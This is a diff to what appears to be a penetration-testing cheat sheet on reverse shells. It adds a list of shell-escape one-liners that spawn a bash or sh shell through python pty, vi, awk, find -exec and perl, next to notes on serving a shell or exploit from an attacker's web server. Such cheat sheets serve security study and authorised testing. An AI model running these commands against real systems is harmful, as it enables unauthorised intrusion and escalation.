@@ -63,6 +63,14 @@ Note:In the above payload python will run and creating bash shell.But while some
 <br>
 python3 -c 'import pty; pty.spawn("/bin/sh")'<br>
 <br>
+ Related Shell Escape Sequences...
+ 
+    python-->python3 -c 'import pty; pty.spawn("/bin/sh")'
+    vi-->   :!bash
+    vi-->   :set shell=/bin/bash:shell
+    awk-->  awk 'BEGIN {system("/bin/bash")}'
+    find--> find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+    perl--> perl -e 'exec "/bin/bash";'
 **File transfer during REVERSE SHELL**<br>
 Attacker: service apache2 start<br>
 place shell or exploit in /var/www/html<br>
